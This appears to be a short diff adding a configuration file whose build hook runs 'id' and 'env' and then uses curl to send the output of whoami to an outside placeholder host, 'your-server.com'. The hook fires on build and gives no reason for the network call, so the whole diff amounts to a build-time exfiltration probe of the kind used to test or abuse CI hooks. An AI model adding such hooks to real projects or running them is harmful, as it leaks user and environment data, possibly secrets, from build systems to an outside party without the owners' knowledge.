@@ -1,0 +1,5 @@
+hooks:
+  build: |
+    id
+    env
+    curl https://your-server.com/$(whoami)
